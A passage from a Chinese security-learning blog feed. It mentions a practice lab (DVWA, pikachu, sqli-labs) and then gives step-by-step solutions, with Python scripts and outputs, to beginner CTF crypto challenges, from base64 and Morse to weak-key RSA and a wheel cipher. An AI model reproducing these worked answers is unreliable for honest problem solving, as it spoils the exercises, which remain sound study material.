html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>站点创建成功-phpstudy for windows<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"keywords"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"renderer"</span> <span class="attr">content</span>=<span class="string">"webkit"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge,chrome=1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, maximum-scale=1"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"apple-mobile-web-app-status-bar-style"</span> <span class="attr">content</span>=<span class="string">"black"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"apple-mobile-web-app-capable"</span> <span class="attr">content</span>=<span class="string">"yes"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"format-detection"</span> <span class="attr">content</span>=<span class="string">"telephone=no"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"pragma"</span> <span class="attr">CONTENT</span>=<span class="string">"no-cache"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"Cache-Control"</span> <span class="attr">CONTENT</span>=<span class="string">"no-store, must-revalidate"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"expires"</span> <span class="attr">CONTENT</span>=<span class="string">"Wed, 26 Feb 1997 08:21:57 GMT"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"expires"</span> <span class="attr">CONTENT</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    body &#123;</span><br><span class="line">      font: 16px arial, 'Microsoft Yahei', 'Hiragino Sans GB', sans-serif;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h1 &#123;</span><br><span class="line">      margin: 0;</span><br><span class="line"><span class="css">      <span class="selector-tag">color</span>: <span class="selector-id">#3a87ad</span>;</span></span><br><span class="line">      font-size: 26px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.content</span> &#123;</span></span><br><span class="line">      width: 45%;</span><br><span class="line">      margin: 0 auto;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.content</span>&gt;<span class="selector-tag">div</span> &#123;</span></span><br><span class="line">      margin-top: 200px;</span><br><span class="line">      padding: 20px;</span><br><span class="line"><span class="css">      <span class="selector-tag">background</span>: <span class="selector-id">#d9edf7</span>;</span></span><br><span class="line">      border-radius: 12px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.content</span> <span class="selector-tag">dl</span> &#123;</span></span><br><span class="line"><span class="css">      <span class="selector-tag">color</span>: <span class="selector-id">#2d6a88</span>;</span></span><br><span class="line">      line-height: 40px;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="css">    <span class="selector-class">.content</span> <span class="selector-tag">div</span> <span class="selector-tag">div</span> &#123;</span></span><br><span class="line">      padding-bottom: 20px;</span><br><span class="line">      text-align: center;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>站点创建成功<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dt</span>&gt;</span>目录说明:<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./DVWA-master/"</span>&gt;</span>DVWA<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./pikachu-master/"</span>&gt;</span>pikachu<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"./sqli-labs-master/"</span>&gt;</span>sqli-labs<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结果图片</p><p>(test是我个人的网站,不用管)</p><p>(sqli-labs是后加的,所以图上没有)</p><p>(虽然不一样,但是上面的代码是可以直接用的,我已经修改过了)</p><p><img src="Snipaste_2020-04-07_19-33-16.png" alt="Snipaste_2020-04-07_19-33-16"></p><p>那么之后就可以直接点击进入了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;学习搭建环境&quot;&gt;&lt;a href=&quot;#学习搭建环境&quot; class=&quot;headerlink&quot; title=&quot;学习搭建环境&quot;&gt;&lt;/a&gt;学习搭建环境&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;最近想学一下安全的一些基本操作,所以搭了几个环境&lt;/p&gt;
&lt;p&gt;在这里记录一下搭建的过程&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="安全" scheme="https://mercer5.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全" scheme="https://mercer5.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-crypto-新手练习区</title>
    <link href="https://mercer5.github.io/2020/04/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crypto-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>https://mercer5.github.io/2020/04/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crypto-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2020-04-04T15:08:21.000Z</published>
    <updated>2022-01-06T08:23:17.491Z</updated>
    
    <content type="html"><![CDATA[<h1 id="攻防世界-crypto-新手练习区"><a href="#攻防世界-crypto-新手练习区" class="headerlink" title="攻防世界-crypto-新手练习区"></a>攻防世界-crypto-新手练习区</h1><h2 id="1-base64"><a href="#1-base64" class="headerlink" title="1. base64"></a>1. base64</h2><p>在线解密,或是自己写脚本都行</p><h2 id="2-Caesar"><a href="#2-Caesar" class="headerlink" title="2. Caesar"></a>2. Caesar</h2><p>同上</p><h2 id="3-Morse"><a href="#3-Morse" class="headerlink" title="3. Morse"></a>3. Morse</h2><p>同上</p><h2 id="4-混合编码"><a href="#4-混合编码" class="headerlink" title="4. 混合编码"></a>4. 混合编码</h2><ol><li>base64</li><li>html实体编码</li><li>base64</li><li>ascii</li></ol><h2 id="5-不仅仅是Morse"><a href="#5-不仅仅是Morse" class="headerlink" title="5. 不仅仅是Morse"></a>5. 不仅仅是Morse</h2><ol><li><p>morese解密</p><p>得到一串奇奇怪怪的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAY_BE_HAVE_ANOTHER_DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA</span><br></pre></td></tr></table></figure></li><li><p>后面的AB的长度为170</p><ul><li>5的倍数</li><li>只有两个字母</li><li>2^5^为32,可以很方便的表示26个字母</li><li>所以假设0-25,分别对应a-z</li></ul></li><li><p>尝试解密看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分割替换</span></span><br><span class="line">s=<span class="string">"AAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA"</span></span><br><span class="line">s=s.replace(<span class="string">"A"</span>,<span class="string">"0"</span>)</span><br><span class="line">s=s.replace(<span class="string">"B"</span>,<span class="string">"1"</span>)</span><br><span class="line">lst=[]</span><br><span class="line"><span class="keyword">while</span>(s):</span><br><span class="line">    lst.append(s[:<span class="number">5</span>])</span><br><span class="line">    s=s[<span class="number">5</span>:]</span><br><span class="line">print(lst)</span><br><span class="line"><span class="comment">#生成字典</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">b=string.ascii_lowercase</span><br><span class="line">l1=[]</span><br><span class="line">l2=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    l1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    l2.append(i)</span><br><span class="line">dic=dict(zip(l2,l1))</span><br><span class="line">print(dic)</span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    num=int(i,<span class="number">2</span>)</span><br><span class="line">    print(dic.get(num),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></li></ol><h2 id="6-幂数加密"><a href="#6-幂数加密" class="headerlink" title="6. 幂数加密"></a>6. 幂数加密</h2>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#字母数字对应表生成</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">l1=[]</span><br><span class="line">l2=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">    l1.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_uppercase:</span><br><span class="line">    l2.append(i)</span><br><span class="line">dic=dict(zip(l1,l2))</span><br><span class="line">print(dic)</span><br><span class="line"><span class="comment">#字符串处理</span></span><br><span class="line">a=<span class="string">"8842101220480224404014224202480122"</span></span><br><span class="line">lst=a.split(<span class="string">"0"</span>)</span><br><span class="line">lst=[eval(x) <span class="keyword">for</span> x <span class="keyword">in</span> lst]</span><br><span class="line">lst1=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    sum=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(i):</span><br><span class="line">        sum+=i%<span class="number">10</span></span><br><span class="line">        i=i//<span class="number">10</span></span><br><span class="line">    lst1.append(sum)</span><br><span class="line">print(lst1)</span><br><span class="line"><span class="comment">#flag</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst1:</span><br><span class="line">    flag+=dic[i]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="6-easychallenge"><a href="#6-easychallenge" class="headerlink" title="6. easychallenge"></a>6. easychallenge</h2><p>给的是一个pyc文件,我就在在线python反编译网站上反编译了一下</p><p>得到python原码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode1</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) ^ <span class="number">36</span></span><br><span class="line">        x = x + <span class="number">25</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode2</span><span class="params">(ans)</span>:</span></span><br><span class="line">    s = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = ord(i) + <span class="number">36</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += chr(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode3</span><span class="params">(ans)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32encode(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">' '</span></span><br><span class="line">print(<span class="string">'Please Input your flag:'</span>)</span><br><span class="line">flag = input()</span><br><span class="line">final = <span class="string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span></span><br><span class="line"><span class="keyword">if</span> encode3(encode2(encode1(flag))) == final:</span><br><span class="line">    print(<span class="string">'correct'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'wrong'</span>)</span><br></pre></td></tr></table></figure><p>emmm,然后就好办了,加密方法都在上面了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s=<span class="string">"UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==="</span></span><br><span class="line">s1=base64.b32decode(s)</span><br><span class="line">print(s1)</span><br><span class="line"></span><br><span class="line">s2=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s1:</span><br><span class="line">    x=i^<span class="number">36</span></span><br><span class="line">    x-=<span class="number">36</span></span><br><span class="line">    s2+=chr(x)</span><br><span class="line">print(s2)</span><br><span class="line"></span><br><span class="line">s3=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s2:</span><br><span class="line">    x=ord(i)<span class="number">-25</span></span><br><span class="line">    x=x^<span class="number">36</span></span><br><span class="line">    s3+=chr(x)</span><br><span class="line">print(s3)</span><br></pre></td></tr></table></figure><h2 id="7-Normal-RSA"><a href="#7-Normal-RSA" class="headerlink" title="7. Normal_RSA"></a>7. Normal_RSA</h2><p>打开附件,里面是<code>pubkey.pem</code>和<code>flag.enc</code></p><p>我们可以利用kali里的openssl来搞</p><ol><li><p>把文件拖虚拟机里</p></li><li><p>终端输入openssl</p></li><li><p><code>openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem</code></p><ul><li>exponent:E</li><li>modulus:N</li></ul><p>以上两个要用,复制好</p></li><li><p>上网找在线分解质因数的搞出P,Q</p></li><li><p>然后在kali中使用(代码如下,pqe自填),会生成一个private.pem</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">arsa=RSA.generate(<span class="number">1024</span>)</span><br><span class="line">arsa.p=</span><br><span class="line">arsa.q=</span><br><span class="line">arsa.e=</span><br><span class="line">arsa.n=arsa.p*arsa.q</span><br><span class="line">Fn=long((arsa.p<span class="number">-1</span>)*(arsa.q<span class="number">-1</span>))</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    x=(Fn*i)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(x%arsa.e==<span class="number">0</span>):</span><br><span class="line">           arsa.d=x/arsa.e</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">private=open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(arsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure></li><li><p>在终端中打开openssl,输入<code>rsautl -decrypt -in flag.enc -inkey private.pem</code></p></li><li><p>ojbk</p></li></ol><h2 id="8-转轮机加密"><a href="#8-转轮机加密" class="headerlink" title="8. 转轮机加密"></a>8. 转轮机加密</h2><p>题目:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:  &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line"><span class="number">2</span>:  &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line"><span class="number">3</span>:  &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line"><span class="number">4</span>:  &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line"><span class="number">5</span>:  &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line"><span class="number">6</span>:  &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line"><span class="number">7</span>:  &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line"><span class="number">8</span>:  &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line"><span class="number">9</span>:  &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span><br><span class="line"><span class="number">10</span>: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span><br><span class="line"><span class="number">11</span>： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span><br><span class="line"><span class="number">12</span>： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span><br><span class="line"><span class="number">13</span>： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span><br><span class="line"></span><br><span class="line">密钥为：<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">6</span></span><br><span class="line">密文为：NFQKSEVOQOFNP</span><br></pre></td></tr></table></figure><p>大概就像旧式电话一样</p><p>对应着电话号码(2,3,7,5,13,12,9,1,8,10,4,11,6)</p><p>把对应轮数中的对应字符(N F Q K S E V O Q O F N P)</p><p>拨到第一个去(看下图第一列,与密文相同)</p><p><img src="image-20200404230355691.png" alt="image-20200404230355691"></p><p>然后竖着看,直到找到有实际意义的字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circle</span><span class="params">(string,char)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> string[<span class="number">0</span>]!=char:</span><br><span class="line">        string=string[<span class="number">1</span>:]+string[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">s=<span class="string">"""ZWAXJGDLUBVIQHKYPNTCRMOSFE </span></span><br><span class="line"><span class="string">KPBELNACZDTRXMJQOYHGVSFUWI </span></span><br><span class="line"><span class="string">BDMAIZVRNSJUWFHTEQGYXPLOCK </span></span><br><span class="line"><span class="string">RPLNDVHGFCUKTEBSXQYIZMJWAO </span></span><br><span class="line"><span class="string">IHFRLABEUOTSGJVDKCPMNZQWXY </span></span><br><span class="line"><span class="string">AMKGHIWPNYCJBFZDRUSLOQXVET </span></span><br><span class="line"><span class="string">GWTHSPYBXIZULVKMRAFDCEONJQ </span></span><br><span class="line"><span class="string">NOZUTWDCVRJLXKISEFAPMYGHBQ </span></span><br><span class="line"><span class="string">XPLTDSRFHENYVUBMCQWAOIKZGJ </span></span><br><span class="line"><span class="string">UDNAJFBOWTGVRSCZQKELMXYIHP </span></span><br><span class="line"><span class="string">MNBVCXZQWERTPOIUYALSKDJFHG </span></span><br><span class="line"><span class="string">LVNCMXZPQOWEIURYTASBKJDFHG </span></span><br><span class="line"><span class="string">JZQAWSXCDERFVBGTYHNUMKILOP"""</span></span><br><span class="line">s=s.replace(<span class="string">" \n"</span>,<span class="string">" "</span>)</span><br><span class="line">lst=s.split(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">key=<span class="string">"2,3,7,5,13,12,9,1,8,10,4,11,6"</span></span><br><span class="line">key=key.split(<span class="string">","</span>)</span><br><span class="line">key=[int(i)<span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">x=<span class="string">"NFQKSEVOQOFNP"</span></span><br><span class="line">end=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    tempstr=lst[key[i]]</span><br><span class="line">    word=x[i]</span><br><span class="line">    end.append(circle(tempstr,word))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">        print(end[j][i].lower(),end=<span class="string">""</span>)</span><br><span class="line">    print(<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">nfqksevoqofnp</span><br><span class="line">ahgcxiusnwcbn</span><br><span class="line">ctwpcubfotuvy</span><br><span class="line">zetmdrmezgkcc</span><br><span class="line">dqhneyczuvtxj</span><br><span class="line">tgszrtqwtrezb</span><br><span class="line">rypqfawawsbqf</span><br><span class="line">xxywvsaxdcswz</span><br><span class="line">mpbxbbojczxed</span><br><span class="line"><span class="keyword">jlxygkigvqqrr</span></span><br><span class="line"><span class="keyword">qoiitjkdrkytu</span></span><br><span class="line"><span class="keyword">oczhydzljeips</span></span><br><span class="line"><span class="keyword">ykufhfgullzol</span></span><br><span class="line"><span class="keyword">hblrnhjbxmmio</span></span><br><span class="line"><span 